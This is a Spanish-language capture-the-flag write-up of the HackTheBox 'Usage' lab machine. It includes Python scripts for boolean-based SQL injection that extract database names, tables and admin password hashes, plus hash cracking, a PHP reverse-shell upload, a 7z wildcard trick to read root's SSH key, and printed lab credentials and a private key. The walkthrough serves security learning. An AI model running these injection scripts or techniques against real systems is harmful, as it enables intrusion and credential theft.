+++ 
draft = false
date = 2026-01-28T05:30:45Z
title = "Usage Machine - HackTheBox"
description = "Esta es una máquina Linux de nivel Fácil de la plataforma HackTheBox, en la cual se toca SQLi"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-------------------------
- Tags: #Machine #Linux #Easy #SQLI 
----------------

# Introducción

Esta es una máquina Linux que aloja un servicio web vulnerable. En la funcionalidad de recuperación de contraseña se identifica una vulnerabilidad de SQL Injection, que mediante un ataque boolean-based permite enumerar la base de datos y extraer credenciales.

Gracias a esto, se obtienen las credenciales del usuario administrador de un sitio alojado en un subdominio, el cual utiliza Laravel 10.18.0. Esta versión presenta una vulnerabilidad de subida de archivos, lo que permite cargar un archivo PHP malicioso y obtener ejecución remota de comandos como un usuario de bajos privilegios.

Durante la enumeración del sistema se descubren credenciales almacenadas en texto plano, las cuales permiten pivotar hacia otro usuario. Dicho usuario posee permisos sudo para ejecutar un binario específico, el cual es vulnerable a lectura arbitraria de archivos. Aprovechando este comportamiento, es posible leer la clave privada SSH de root (`id_rsa`) y autenticarse como dicho usuario, comprometiendo completamente la máquina.

# Enumeración Nmap

Realizamos un escaneo de puertos en la máquina víctima, encontrando el puerto `22` y  `80` abiertos.

```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.129.5.224 -oG allPorts
```


Para obtener mayor información acerca de los servicios y versiones, realizamos el siguiente escaneo

```bash
nmap -p22,80 -sCV 10.129.5.224 -oN portServices
```

Teniendo los siguientes resultados, viendo un redirect hacia `usage.htb`

<img src="/images/Pasted image 20260126210320.png" style="width:100%; height:auto; display:block; margin:auto;">

añadimos el dominio en nuestro `/etc/hosts`

<img src="/images/Pasted image 20260126210411.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración servicio HTTP

Vemos la página principal, que tiene un `login`, `register`,`reset password` y `admin`

<img src="/images/Pasted image 20260126210830.png" style="width:100%; height:auto; display:block; margin:auto;">

En el apartado de `admin`, nos muestra un subdominio que debemos agregar en nuestro `/etc/hosts`

<img src="/images/Pasted image 20260126210944.png" style="width:100%; height:auto; display:block; margin:auto;">

El subdominio `admin.usage.htb` nos muestra una página de login, la cual pide usuario y contraseña

<img src="/images/Pasted image 20260126211031.png" style="width:100%; height:auto; display:block; margin:auto;">

# SQLI manual con Python

Probando entre las diferentes rutas, encontramos que `/forget-password` es vulnerable a #SQLI 

Vemos que la petición normal nos arroja como respuesta el mensaje `Email address does not match in our records!`

<img src="/images/Pasted image 20260128000804.png" style="width:100%; height:auto; display:block; margin:auto;">

Si mandamos una comilla en el parámetro `email`, nos devuelve un código 500 `SERVER ERROR`

<img src="/images/Pasted image 20260128000845.png" style="width:100%; height:auto; display:block; margin:auto;">

## SQLi Boolean


Ahora probaremos el siguiente payload para ver si es vulnerable a un ataque booleano

```bash
_token=gVqHnJ7IHMmT9KS4Bhja4uTQf7srmPDpg06Jemwc&email=admin%40admin.htb' or '1'='1'--+-
```

Teniendo como respuesta que acepta la petición

<img src="/images/Pasted image 20260128001034.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora mandaremos lo mismo, pero con una igualdad errónea, buscando el mensaje de error

```bash
_token=gVqHnJ7IHMmT9KS4Bhja4uTQf7srmPDpg06Jemwc&email=admin%40admin.htb' or '1'='2'--+-
```

y el mensaje de error es el que vimos anteriormente

<img src="/images/Pasted image 20260128001117.png" style="width:100%; height:auto; display:block; margin:auto;">

Teniendo una respuesta diferente cuando la petición es exitosa y cuando no, es una vía potencial para realizar enumeración de la base de datos mediante SQLi Booleana

## Obtener Base de datos

Para obtener el nombre de la base de datos tenemos el siguiente payload

```bash
' or substring(database(),1,1)='a'-- -
```

El cual nos mostrará el mensaje `We have`... cuando encontramos el carácter correcto

Si probamos si el primer valor de el nombre de la base de datos es `a`, nos aparece un error, pero si probamos si el primer valor es `u`, nos devuelve el mensaje exitoso.

```bash
_token=gVqHnJ7IHMmT9KS4Bhja4uTQf7srmPDpg06Jemwc&email=admin%40admin.htb' or substring(database(),1,1)='u'--+-
```

<img src="/images/Pasted image 20260128001529.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto podemos realizar un script en python que itere los valores de posición y el de caracteres.

Teniendo el siguiente script

```python
import requests
import string
import os
import re

baseURL = "http://usage.htb"
param = "/forget-password"
characters = string.ascii_letters + string.digits + string.punctuation
box = ""

# Obtener cookies
s = requests.Session()

# Obtener CSRF 
r = s.get(baseURL + param)
token = re.search(r'name="_token" value="(.*?)"', r.text).group(1)
print("[+] CSRF:", token)
print("[+] Cookies:", s.cookies)

for pos in range(1,11):
   for char in (characters):

      payload = f"or substring(database(),{pos},1)='{char}'-- -"
      data = {"_token":token,"email":f"admin@admin.htb' {payload}"}
      r = s.post(baseURL + param,json=data)
      print(payload)
      if "We have" in r.text:
         os.system("clear")
         box = box + char
         print(box)
         break
```

Obtenemos que el nombre de la base de datos es `usage_blog`

## Obtener Tablas

Para obtener las tablas de la base de datos, tenemos el siguiente payload

```bash
or substring((select group_concat(table_name) from information_schema.tables where table_schema='usage_blog'),1,1)='a'--+-
```

Al igual que con la base de datos, podemos realizar un script en Python que nos dé el nombre de todas las tablas.

El siguiente script permite conseguir el nombre de todas las tablas de la base de datos anteriormente encontrada

```python
import requests
import string
import os
import re

baseURL = "http://usage.htb"
param = "/forget-password"
characters = string.ascii_letters + string.digits + string.punctuation
box = ""

# Obtener cookies
s = requests.Session()

# Obtener CSRF 
r = s.get(baseURL + param)
token = re.search(r'name="_token" value="(.*?)"', r.text).group(1)
print("[+] CSRF:", token)
print("[+] Cookies:", s.cookies)

for pos in range(1,300):
   for char in (characters):

      payload = f"or substring((select group_concat(table_name) from information_schema.tables where table_schema='usage_blog'),{pos},1)='{char}'-- -"
      data = {"_token":token,"email":f"admin@admin.htb' {payload}"}
      r = s.post(baseURL + param,json=data)
      print(payload)
      if "We have" in r.text:
         os.system("clear")
         box = box + char
         print(box)
         break
```

Encontramos muchas tablas, pero la más interesante es la tabla `admin_users`

<img src="/images/Pasted image 20260128010450.png" style="width:100%; height:auto; display:block; margin:auto;">

## Obtener las columnas


Para obtener las columnas de la tabla `admin_users`, tenemos el siguiente payload

```bash
or substring((select group_concat(column_name) from information_schema.columns where table_schema='usage_blog' and table_name='admin_users'),1,1)='a'--+-
```

El siguiente en Python script permite encontrar las columnas de la tabla `admin_users`

```python
import requests
import string
import os
import re

baseURL = "http://usage.htb"
param = "/forget-password"
characters = "," + string.ascii_letters + string.digits + string.punctuation
box = ""

# Obtener cookies
s = requests.Session()

# Obtener CSRF
r = s.get(baseURL + param)
token = re.search(r'name="_token" value="(.*?)"', r.text).group(1)
print("[+] CSRF:", token)
print("[+] Cookies:", s.cookies)

for pos in range(1,300):
   for char in (characters):

      payload = f"or substring((select group_concat(column_name) from information_schema.columns where table_schema='usage_blog' and table_name='admin_users'),{pos},1)='{char}'-- -"
      data = {"_token":token,"email":f"admin@admin.htb' {payload}"}
      r = s.post(baseURL + param,json=data)
      print(payload)
      if "We have" in r.text:
         os.system("clear")
         box = box + char
         print(box)
         break
```

Encontramos como columnas relevantes `username` y `password`

<img src="/images/Pasted image 20260128011321.png" style="width:100%; height:auto; display:block; margin:auto;">

## Obtener valores de columnas

Para obtener los valores de las columnas interesadas, en este caso `username` y `password`, tenemos el siguiente payload

**NOTA:** `BINARY` se utiliza para hacer que la petición de case-sensitive.

```bash
or substring((select group_concat(BINARY username, ':', BINARY password) from admin_users),{pos},1)='{char}'--+-
```

El siguiente script permite obtener los datos de `username` y `password`, los resultados aparecerán separados por dos puntos `:`.

 ```python
import requests
import string
import os
import re

baseURL = "http://usage.htb"
param = "/forget-password"
characters = "," + ":" + string.ascii_letters + string.digits + string.punctuation
box = ""

# Obtener cookies
s = requests.Session()

# Obtener CSRF
r = s.get(baseURL + param)
token = re.search(r'name="_token" value="(.*?)"', r.text).group(1)
print("[+] CSRF:", token)
print("[+] Cookies:", s.cookies)

for pos in range(1,300):
   for char in (characters):

      payload = f"or substring((select group_concat(BINARY username, ':', BINARY password) from admin_users),{pos},1)='{char}'-- -"
      data = {"_token":token,"email":f"admin@admin.htb' {payload}"}
      r = s.post(baseURL + param,json=data)
      print(payload)
      if "We have" in r.text:
         os.system("clear")
         box = box + char
         print(box)
         break
 ```

Obtenemos el usuario `admin` y el siguiente hash `$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2`

<img src="/images/Pasted image 20260128012953.png" style="width:100%; height:auto; display:block; margin:auto;">

# Crackeando hash

El hash obtenido lo guardamos en un archivo llamado `hash.txt`, y utilizamos `john` para crackearlo, de la siguiente forma

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

y obtenemos la contraseña `whatever1`

<img src="/images/Pasted image 20260128013359.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora probaremos entrar con las credenciales en el subdominio `admin.usage.htb`

<img src="/images/Pasted image 20260128013529.png" style="width:100%; height:auto; display:block; margin:auto;">

y entramos exitosamente como `Administrator`

<img src="/images/Pasted image 20260128013549.png" style="width:100%; height:auto; display:block; margin:auto;">

# Explotando File upload

Si buscamos por vulnerabilidades de `laravel 10.18.0` encontramos algunas menciones de subida arbitraria de archivos que permiten ejecución de comandos

<img src="/images/Pasted image 20260128013750.png" style="width:100%; height:auto; display:block; margin:auto;">

Viendo la página de `laravel`, encontramos que podemos subir una imagen como `avatar`

<img src="/images/Pasted image 20260128013927.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto probamos subir una imagen cualquiera

y vemos que nos permite subir imágenes, y tenemos la ruta en donde se suben, que es `/uploads/images/foto.jpg`

<img src="/images/Pasted image 20260128014102.png" style="width:100%; height:auto; display:block; margin:auto;">

Probaremos interceptar la petición, y enviar un archivo `.PHP` que nos envíe una `reverse shell`

Enviamos la petición editando el nombre, poniendo `shell.jpg.php`, y mandando el contenido de la `reverse shell` en `PHP`

<img src="/images/Pasted image 20260128014813.png" style="width:100%; height:auto; display:block; margin:auto;">

Vemos que nuestro script se subió de manera correcta

<img src="/images/Pasted image 20260128014627.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora si nos ponemos en escucha con `netcat`, y vamos hacia la ruta `/uploads/images/shell1.jpg.php`, obtendremos la consola interactiva

<img src="/images/Pasted image 20260128015106.png" style="width:100%; height:auto; display:block; margin:auto;">

# Movimiento lateral

Una vez en la máquina víctima, vemos que somos el usuario `dash`

<img src="/images/Pasted image 20260128015204.png" style="width:100%; height:auto; display:block; margin:auto;">

Además sabemos que existe el usuario `xander`, ya que tiene directorio en `/home` y usa `bash`

<img src="/images/Pasted image 20260128015256.png" style="width:100%; height:auto; display:block; margin:auto;">

Si vamos al `home` de nuestro usuario actual, encontramos la `user.txt`

<img src="/images/Pasted image 20260128015337.png" style="width:100%; height:auto; display:block; margin:auto;">

También encontramos un archivo inusual, el archivo `.monitrc`, el cual tenemos permiso de lectura

<img src="/images/Pasted image 20260128015412.png" style="width:100%; height:auto; display:block; margin:auto;">

Procedemos a leerlo, y encontramos unas credenciales `admin:3nc0d3d_pa$$w0rd`

<img src="/images/Pasted image 20260128015642.png" style="width:100%; height:auto; display:block; margin:auto;">

Probamos a utilizar la contraseña, y el usuario `xander` para conectarnos por `SSH`

```bash
ssh xander@usage.htb
```

y nos conectamos a la máquina víctima como este nuevo usuario

<img src="/images/Pasted image 20260128015806.png" style="width:100%; height:auto; display:block; margin:auto;">

# Escalada de privilegios

Para escalar privilegios, vemos los permisos de sudoers que tiene este nuevo usuario, y vemos que tiene permiso para ejecutar el binario `/usr/bin/usage_management` sin la necesidad de proporcionar contraseña

<img src="/images/Pasted image 20260128015857.png" style="width:100%; height:auto; display:block; margin:auto;">

Si le hacemos un `strings` al binario, podemos ver algunas cosas que realiza

Vemos que se mueve hacia la ruta `/var/www/html`, y posteriormente utiliza `7za` para comprimir todo lo que se encuentra ahí

<img src="/images/Pasted image 20260128015958.png" style="width:100%; height:auto; display:block; margin:auto;">

Buscando por formas de explotar `wildcards`, encontramos una forma para hacerlo con `7z`

<img src="/images/Pasted image 20260128020136.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto utilizaremos esto para leer el `id_rsa` del usuario root, y posteriormente conectarnos por `SSH` sin proporcionar contraseña

Crearemos el archivo `@id_rsa` en el directorio `/var/www/html`, y generaremos un enlace simbólico hacía  `/root/.ssh/id_rsa`

<img src="/images/Pasted image 20260128020356.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora utilizamos el binario como sudo, y le daremos a la opción 1, obteniendo el `id_rsa` de root

<img src="/images/Pasted image 20260128020830.png" style="width:100%; height:auto; display:block; margin:auto;">

Tratando el output obtenido, tenemos lo siguiente

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----
```

Lo guardamos en local y le damos el permiso `chmod 600 id_rsa`, y para conectarnos utilizaremos el siguiente comando

```bash
root@usage.htb -i id_rsa
```

<img src="/images/Pasted image 20260128021020.png" style="width:100%; height:auto; display:block; margin:auto;">

y nos conectamos como `root`, y obtenemos la `root.txt`

<img src="/images/Pasted image 20260128021042.png" style="width:100%; height:auto; display:block; margin:auto;">







